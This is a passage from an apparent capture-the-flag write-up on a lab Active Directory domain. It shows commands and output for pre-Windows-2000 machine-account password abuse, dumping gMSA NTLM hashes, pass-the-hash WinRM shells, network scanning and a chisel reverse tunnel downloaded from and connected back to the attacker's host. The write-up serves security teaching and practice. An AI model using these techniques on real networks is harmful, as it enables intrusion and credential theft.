4c93881bfe7321bd0bff98880ba666d23aedc33983eca78530103fa17444ec8d6eaaa50339488d5c10bdc69e7f929c1d2b853c5560a33b02c84a3a5676d0d441dd5b5bce9209acd8b49f8dea2b4dd5a87ac8533e20ecefd69b8f4f4182654bb37d0b984e39b7c5f9f4c30e6b1748a0dde21a44eda0d242e36a74b3ec8c0005d7f71f7d283f5d98563cd362ffffc62b784a00fe12fa7b21efe33f8c9d8600da55f08d02c5140968f095267b4945cbaaa37443389c2762b2425f9d063e3c7fa82bdad28f58c0fecaadbb1753beb53ce6fe77faf00f848df16911357499b7b57d6c1d945347f4901d
```

Unfortunately for me, neither challenge cracks under `rockyou.txt`, which suggests it’s not meant to be cracked.

#### Machine Account Quota

The Machine Account Quota on the domain is set at 10:

```css
oxdf@hacky$ netexec ldap DC01.pirate.htb -u pentest -p 'p3nt3st2025!&' -M maq
LDAP        10.129.60.234   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.60.234   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
MAQ         10.129.60.234   389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.129.60.234   389    DC01             MachineAccountQuota: 10
```

This means I can add machines as any user if need be.

#### BloodHound

I’ll collect BloodHound data using [RustHound-CE](https://github.com/g0h4n/RustHound-CE):

```css
oxdf@hacky$ rusthound-ce -d pirate.htb -u pentest -p 'p3nt3st2025!&' --zip
---------------------------------------------------
Initializing RustHound-CE at 04:03:58 on 08/12/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-08-12T04:03:58Z INFO  rusthound_ce] Verbosity level: Info
[2026-08-12T04:03:58Z INFO  rusthound_ce] Collection method: All
[2026-08-12T04:03:58Z INFO  rusthound_ce::ldap] Connected to PIRATE.HTB Active Directory!
[2026-08-12T04:03:58Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-08-12T04:03:58Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-12T04:03:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=pirate,DC=htb
[2026-08-12T04:03:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-12T04:03:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=pirate,DC=htb
[2026-08-12T04:03:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-12T04:04:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=pirate,DC=htb
[2026-08-12T04:04:00Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-12T04:04:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=pirate,DC=htb
[2026-08-12T04:04:00Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-12T04:04:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=pirate,DC=htb
[2026-08-12T04:04:00Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-08-12T04:04:00Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
⢀ Parsing LDAP objects: 6%
[2026-08-12T04:04:00Z INFO  rusthound_ce::objects::enterpriseca] Found 12 enabled certificate templates
[2026-08-12T04:04:00Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 10 users parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 62 groups parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 4 computers parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 75 containers parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-08-12T04:04:00Z INFO  rusthound_ce::json::maker::common] .//20260812040400_pirate-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 04:04:00 on 08/12/26! Happy Graphing!
```

I’ll start the BloodHound-CE Docker container and upload the data. The pentest user doesn’t have any interesting outbound control:

![image-20260811174022428](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/495f7d829b45a2f9.png)

![image-20260811174022428](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260811174022428.webp)

Poking around a bit more, there’s a PRE-WINDOWS 2000 COMPATIBLE ACCESS group, and it has three computers in it:

![image-20260811180231948](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7b5e5344d6db56c0.png)

![image-20260811180231948](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260811180231948.webp)

[Pre-Windows 2000 Compatible Access](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7a76a403-ed8d-4c39-adb7-a3255cab82c5) is a Microsoft-defined builtin group that exists in every domain, and Authenticated Users being a member is the default when a domain is created with modern permissions. The DC being in this group isn’t super uncommon either. But the other computers are interesting.

EXCH01 doesn’t have any interesting permissions, but MS01 is a member of Domain Secure Servers:

![image-20260811180734806](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/94673e9800cb9ee8.png)

![image-20260811180734806](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260811180734806.webp)

As identified [above](#bloodhound), this gives it `ReadGMSAPassword` over two GMSA accounts. Both are in Remote Management Users:

![image-20260811212221318](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5c02ee7ce5e949cf.png)

![image-20260811212221318](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260811212221318.webp)

#### Delegation

A quick thing to check for (and that I’ll use later) is delegation set up on the domain:

```
oxdf@hacky$ findDelegation.py -dc-ip 10.129.60.234 'pirate.htb/pentest:p3nt3st2025!&'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

AccountName  AccountType  DelegationType                      DelegationRightsTo     SPN Exists 
-----------  -----------  ----------------------------------  ---------------------  ----------
DC01$        Computer     Unconstrained                       N/A                    Yes        
a.white_adm  Person       Constrained w/ Protocol Transition  http/WEB01.pirate.htb  Yes        
a.white_adm  Person       Constrained w/ Protocol Transition  HTTP/WEB01             Yes
```

`netexec` can find the same info:

```css
oxdf@hacky$ netexec ldap DC01.pirate.htb -u pentest -p 'p3nt3st2025!&' --find-delegation
LDAP        10.129.60.234   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.60.234   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
LDAP        10.129.60.234   389    DC01             AccountName AccountType DelegationType                     DelegationRightsTo                     
LDAP        10.129.60.234   389    DC01             ----------- ----------- ---------------------------------- ---------------------------------------
LDAP        10.129.60.234   389    DC01             a.white_adm Person      Constrained w/ Protocol Transition http/WEB01.pirate.htb, HTTP/WEB01      
```

There are two delegations here, represented as three rows in `findDelegation.py` because it shows WEB01 and WEB01.pirate.htb on separate lines, and one row by `netexec` because it ignores the default DC delegation:

-   DC01$ - Unconstrained: Every domain controller has unconstrained delegation by default.
-   a.white_adm - Constrained delegation with protocol transition to HTTP/WEB01: A.White_adm can impersonate any user to the HTTP service on WEB01. “Protocol transition” means A.White_adm has the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag set, so it can use S4U2Self to request a ticket for any user to itself (without that user’s password) and then S4U2Proxy that into a ticket for `HTTP/WEB01`.

I’ll come back to this when I have auth as A.White_adm.

## Shell as gMSA_ADFS_prod$ on DC01

### Pre-Windows 2000 Compatible Access

I’ve dealt with this a few times before (see [HTB Vintage](https://0xdf.gitlab.io/2025/04/26/htb-vintage.html), [HTB Retro](https://0xdf.gitlab.io/2025/06/24/htb-retro.html), and [HTB RetroTwo](https://0xdf.gitlab.io/2025/07/22/htb-retrotwo.html)). Machine accounts with this configuration use their lowercase hostname (minus a trailing `$`) as their password. `netexec` has a module to check for this:

```css
oxdf@hacky$ netexec ldap pirate.htb -u pentest -p 'p3nt3st2025!&' -M pre2k
LDAP        10.129.60.234   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.60.234   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
PRE2K       10.129.60.234   389    DC01             Pre-created computer account: MS01$
PRE2K       10.129.60.234   389    DC01             Pre-created computer account: EXCH01$
PRE2K       10.129.60.234   389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/oxdf/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
PRE2K       10.129.60.234   389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb
PRE2K       10.129.60.234   389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb
PRE2K       10.129.60.234   389    DC01             [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/oxdf/.nxc/modules/pre2k/ccache
```

It works for both MS01$ and EXCH01$, using the known password format to authenticate, saving TGTs for both.

I can show that manually. It won’t work over NTLM, but will over Kerberos:

```css
oxdf@hacky$ netexec ldap pirate.htb -u 'MS01$' -p ms01
LDAP        10.129.60.234   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.60.234   389    DC01             [-] pirate.htb\MS01$:ms01 
oxdf@hacky$ netexec ldap pirate.htb -u 'MS01$' -p ms01 -k
LDAP        pirate.htb      389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        pirate.htb      389    DC01             [+] pirate.htb\MS01$:ms01 
```

### GMSA Creds

Running as a user in the Domain Secure Servers group, `netexec` will now dump GMSA NTLM hashes for both accounts:

```css
oxdf@hacky$ netexec ldap pirate.htb -u 'MS01$' -p ms01 -k --gmsa
LDAP        pirate.htb      389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        pirate.htb      389    DC01             [+] pirate.htb\MS01$:ms01 
LDAP        pirate.htb      389    DC01             [*] Getting GMSA Passwords
LDAP        pirate.htb      389    DC01             Account: gMSA_ADCS_prod$      NTLM: 1430191bce4f3731edd34d8c24a56c23     PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAP        pirate.htb      389    DC01             Account: gMSA_ADFS_prod$      NTLM: bb510d80e8ed89f4cc81a1f1d374e164     PrincipalsAllowedToReadPassword: Domain Secure Servers
```

With these, I can get a shell as either account (both are in Remote Management Users).

```rust
oxdf@hacky$ evil-winrm-py -i DC01.pirate.htb -u 'gMSA_ADFS_prod$' -H bb510d80e8ed89f4cc81a1f1d374e164
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.pirate.htb:5985' as 'gMSA_ADFS_prod$'
evil-winrm-py PS C:\Users\gMSA_ADFS_prod$\Documents>
```

At this point it’s not clear if there’s a difference between them.

## Shell as Administrator on WEB01

### DC01 Enumeration

#### Users

There are no other interesting users on the box besides Administrator:

```
evil-winrm-py PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/16/2026  12:40 AM                Administrator
d-----        8/12/2026   8:50 PM                gMSA_ADCS_prod$
d-----        8/12/2026   8:51 PM                gMSA_ADFS_prod$
d-r---         6/8/2025   7:32 AM                Public
```

Both user’s home directories are empty.

#### Host

The filesystem is pretty empty as well:

```sql
evil-winrm-py PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/8/2025   1:00 PM                inetpub
d-----        11/5/2022  12:03 PM                PerfLogs
d-r---        7/28/2025   9:08 PM                Program Files
d-----         6/9/2025   8:44 AM                Program Files (x86)
d-r---        8/12/2026   8:51 PM                Users
d-----        2/24/2026   4:27 PM                Windows
```

`inetpub` is empty (which makes sense as the webserver is on the VM). There aren’t any exciting programs in either `Program Files` directory.

#### Network

The host does have two network interfaces:

```yaml
evil-winrm-py PS C:\> ipconfig

Windows IP Configuration

Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.60.234
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
```

`Ethernet0 2` is the target IP I’ve been interacting with, and the virtual switch is.1 on the 192.168.100.0/24 subnet.

`arp` shows there’s another host on.2:

```sql
evil-winrm-py PS C:\> arp -a

Interface: 192.168.100.1 --- 0x8
  Internet Address      Physical Address      Type
  192.168.100.2         00-15-5d-0b-d0-02     dynamic   
  192.168.100.255       ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static    

Interface: 10.129.60.234 --- 0x10
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b0-4e-f9     dynamic   
  ...[snip: other hosts on the HTB VPN /16 segment]...
  10.129.255.255        ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

I can run a fast PowerShell ping sweep using the async.NET ping API:

```powershell
evil-winrm-py PS C:\> $t = 1..254 | % { ([System.Net.NetworkInformation.Ping]::new()).SendPingAsync("192.168.100.$_",200) }
evil-winrm-py PS C:\> [Threading.Tasks.Task]::WaitAll($t)
evil-winrm-py PS C:\> 0..253 | % { if ($t[$_].Result.Status -eq 'Success') { "192.168.100.$($_+1) up" } }
192.168.100.1 up
192.168.100.2 up
```

Same two hosts.

### WEB01 Remote Enumeration

#### Port Scan

I can do a full port scan (takes a minute or two) the same way:

```powershell
evil-winrm-py PS C:\> $open = @()
evil-winrm-py PS C:\> 1..65535 | Group-Object { [math]::Floor($_/2000) } | % { $b = $_.Group | % { $c=[Net.Sockets.TcpClient]::new(); [pscustomobject]@{Port=$_;R=$c.BeginConnect("192.168.100.2",$_,$null,$null);C=$c} }; Start-Sleep -Milliseconds 300;  $b | % { if ($_.C.C
onnected) { $open += $_.Port }; $_.C.Close() } }
evil-winrm-py PS C:\> $open | Sort-Object
80
135
139
445
5985
47001
49664
49665
49668
49677
49687
49706
49707
```

#### Tunnel

I’ll grab the latest release from [Chisel](https://github.com/jpillora/chisel) and upload the Windows executable to Pirate:

```
evil-winrm-py PS C:\programdata> wget 10.10.15.169/chisel_1.10.1_windows_amd64 -outfile c.exe
```

I’ll start the server on my host, and then connect:

```
evil-winrm-py PS C:\programdata> .\c.exe client 10.10.15.169:8000 R:socks
```

It hangs, but at the server:

```css
oxdf@hacky$ /opt/chisel/chisel_1.11.8_linux_amd64 server --reverse -p 8000
2026/08/13 19:50:26 server: Reverse tunnelling enabled
2026/08/13 19:50:26 server: Fingerprint Anu0icX8wNu///gmeU6Wx1bs8P/DiLYhh6k2Gd+4snA=
2026/08/13 19:50:26 server: Listening on http://0.0.0.0:8000
2026/08/13 19:51:02 server: session#1: Client version (1.10.1) differs from server version (1.11.8)
2026/08/13 19:51:02 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

#### SMB - TCP 445

`netexec` shows the hostname as WEB01:

```css
oxdf@hacky$ proxychains netexec smb WEB01.pirate.htb 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:135  ...  OK
SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
```

It also shows that SMB signing is set to False in red! I’ll come back to this.

NTLM auth as the MS01$ account doesn’t work, but Kerberos does:

```css
oxdf@hacky$ proxychains netexec smb 192.168.100.2 -u 'MS01$' -p ms01
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:135  ...  OK
SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
SMB         192.168.100.2   445    WEB01            [-] pirate.htb\MS01$:ms01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
oxdf@hacky$ proxychains netexec smb 192.168.100.2 -u 'MS01$' -p ms01 -k
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:135  ...  OK
SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  pirate.htb:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  pirate.htb:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  pirate.htb:88  ...  OK
SMB         192.168.100.2   445    WEB01            [+] pirate.htb\MS01$:ms01 
```

The service accounts can auth as well:

```css
oxdf@hacky$ proxychains netexec smb 192.168.100.2 -u 'gMSA_ADFS_prod$' -H bb510d80e8ed89f4cc81a1f1d374e164 -k
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:135  ...  OK
SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  pirate.htb:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  pirate.htb:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  pirate.htb:88  ...  OK
SMB         192.168.100.2   445    WEB01            [+] pirate.htb\gMSA_ADFS_prod$:bb510d80e8ed89f4cc81a1f1d374e164 
```

There are no interesting shares here.

#### Web - TCP 80

The webserver is the same server that’s available via the proxy on the main challenge IP:

```html
oxdf@hacky$ proxychains curl 192.168.100.2
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:80  ...  OK
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS Windows Server</title>
<style type="text/css">
<!--
body {
        color:#000000;
        background-color:#0072C6;
        margin:0;
}

#container {
        margin-left:auto;
        margin-right:auto;
        text-align:center;
        }

a img {
        border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="iisstart.png" alt="IIS" width="960" height="600" /></a>
</div>
</body>
</html>
```

### WEB01 Host Enumeration

#### Shell

I can get a shell on this host over my tunnel with `evil-winrm-py` using the gMSA_ADFS_prod$ account:

```css
oxdf@hacky$ proxychains evil-winrm-py -i WEB01.pirate.htb -u 'gMSA_ADFS_prod$' -H bb510d80e8ed89f4cc81a1f1d374e164
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17              
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'WEB01.pirate.htb:5985' as 'gMSA_ADFS_prod$'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  web01.pirate.htb:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  web01.pirate.htb:5985  ...  OK
evil-winrm-py PS C:\Users\gMSA_ADFS_prod$.PIRATE\Documents>
```

Interestingly, gMSA_ADCS_prod$ doesn’t work. I’ll go into why in [Beyond Root](#gmsa-accounts-winrm-on-web01).

#### Filesystem

Administrator and gMSA_ADFS_prod$ both have multiple home directories:

```sql
evil-winrm-py PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/15/2026   7:37 PM                a.white
d-----         6/9/2025  10:11 AM                Administrator
d-----         6/9/2025   6:55 AM                Administrator.PIRATE
d-----         6/9/2025   7:31 AM                gMSA_ADFS_prod$
d-----        1/15/2026   6:40 PM                gMSA_ADFS_prod$.PIRATE
d-r---         6/8/2025   1:29 PM                Public 
```

This happens when Windows goes to create a profile directory but `C:\Users\<username>` already exists owned by a different SID. Rather than reuse it, it appends the domain name, producing a second folder in the form `<username>.<DOMAIN>` (and would add an incrementing number after that if needed). The two pairs here likely have different causes. `Administrator` is likely because both `WEB01\Administrator` and `PIRATE\Administrator` both logged in, and both have the same short name, Administrator. The `gMSA_ADFS_prod$` pair is not that (it’s very unlikely there’s a local account with that name as they’re domain-only objects), so only one principal is involved. Its bare folder is an orphaned profile tied to a now-dead SID. It seems likely that the account was recreated during the box build, so the current login fell back to `gMSA_ADFS_prod$.PIRATE`.

In the root of `C:` there’s an interesting `ADFSTheme` directory:

```sql
evil-winrm-py PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/9/2025   8:06 AM                ADFSTheme
d-----         6/8/2025   1:39 PM                inetpub
d-----        11/5/2022  12:03 PM                PerfLogs
d-r---         6/8/2025   1:29 PM                Program Files
d-----         6/9/2025   8:43 AM                Program Files (x86)
d-r---         6/9/2025  10:11 AM                Users
d-----        2/24/2026   6:18 PM                Windows
```

This is a custom AD FS web theme, providing the sign-in page skin for the federation service. ADFS is Microsoft’s on-prem identity / single-sign-on (SSO) provider. However, ADFS listens on port 443, which isn’t listening on this host. Even though the `adfssrv` service is set to auto-start (as I’ll see below), it isn’t actually up, so this may be a red herring.

#### Services

The direct ways to list services all fail with access denied (`Get-Service` and `net start` can’t open the Service Control Manager, and WMI/CIM is blocked as well):

```
evil-winrm-py PS C:\> net start
System error 5 has occurred.
Access is denied.
evil-winrm-py PS C:\> tasklist /svc | Select-Object -First 4
ERROR: Access denied
System.Management.Automation.RemoteException
```

I can still read the services out of the registry, filtering to the ones set to start automatically on boot (`Start = 2`):

```rust
evil-winrm-py PS C:\> Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\*' | Where Start -eq 2 | Select PSChildName, DisplayName

PSChildName            DisplayName
-----------            -----------
adfssrv                @%WINDIR%\ADFS\Microsoft.IdentityServer.NativeResources.dll,-105
...[snip]...
MSSQL$MICROSOFT##WID   Windows Internal Database
...[snip]...
Spooler                @%systemroot%\system32\spoolsv.exe,-1
...[snip]...
W3SVC                  @%windir%\system32\inetsrv\iisres.dll,-30003
WebClient              WebClient
Winmgmt                @%Systemroot%\system32\wbem\wmisvc.dll,-205
WinRM                  @%Systemroot%\system32\wsmsvc.dll,-101
```

(This also lists a few auto-start drivers; I’ve snipped those along with the rest of the stock services.)

Most of this is stock Windows, but a few stand out:

-   `Spooler` - the Print Spooler is running, which is what makes the PrinterBug coercion possible.
-   `adfssrv` / `MSSQL$MICROSOFT##WID` - the ADFS role and its Windows Internal Database backing store.
-   `WebClient` - the WebDAV Redirector.

The WebDAV Redirector (`WebClient`) isn’t installed or running by default on a Windows Server, so seeing it here at all is out of place. On top of that, it’s set to Automatic start rather than the default Manual / trigger-start:

```
evil-winrm-py PS C:\> (Get-Item 'HKLM:\SYSTEM\CurrentControlSet\Services\WebClient').GetValue('Start')
2
```

Someone deliberately configured this service to launch on boot. A running WebClient service enables coercing authentication over HTTP/WebDAV rather than SMB. I can check this from `netexec`:

```css
oxdf@hacky$ proxychains netexec smb web01.pirate.htb -u pentest -p 'p3nt3st2025!&' -M webdav
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  web01.pirate.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  web01.pirate.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  web01.pirate.htb:135  ...  OK
SMB         224.0.0.1       445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  web01.pirate.htb:445  ...  OK
SMB         224.0.0.1       445    WEB01            [+] pirate.htb\pentest:p3nt3st2025!& 
WEBDAV      224.0.0.1       445    WEB01            WebClient Service enabled on: 224.0.0.1
```

#### SMB

I noted above that SMB signing was off! That’s unusual. I can verify that here:

```
evil-winrm-py PS C:\> Get-SmbServerConfiguration | Select-Object EnableSecuritySignature, RequireSecuritySignature | fl

EnableSecuritySignature  : False
RequireSecuritySignature : False
```

I can also check the `LmCompatibilityLevel`:

```
evil-winrm-py PS C:\> (Get-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa').GetValue('LmCompatibilityLevel')
2
```

The `LmCompatibilityLevel` values are:

| Value | Behavior | NetNTLMv1 obtainable? |
| --- | --- | --- |
| 0   | Send LM and NTLMv1 responses; no NTLMv2 session security | Yes |
| 1   | Send LM and NTLMv1 responses; NTLMv2 session security if negotiated | Yes |
| 2   | Send NTLMv1 only (no LM); NTLMv2 session security if negotiated | Yes |
| 3   | Send NTLMv2 response only (the modern default) | No  |
| 4   | DC refuses LM (accepts NTLM / NTLMv2) | server-side policy |
| 5   | DC refuses LM and NTLM (NTLMv2 only) | No  |
| (absent) | Defaults to 3 | No  |

`LmCompatibilityLevel` sets the response type the client will emit. Anything 2 or less means that the host will still produce an NTLMv1 response.

#### Users

There’s also another user logged in. From WinRM, I can’t directly run `qwinsta`, but I can through [RunasCs](https://github.com/antonioCoco/RunasCs) (I’ve show this before, most recently in [HTB NanoCrop](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html#session-enumeration)):

```
evil-winrm-py PS C:\programdata> qwinsta
No session exists for *
evil-winrm-py PS C:\programdata> .\RunasCs.exe whatever whatever qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           a.white                   1  Active
 31c5ce94259d4...                        65536  Listen  
```

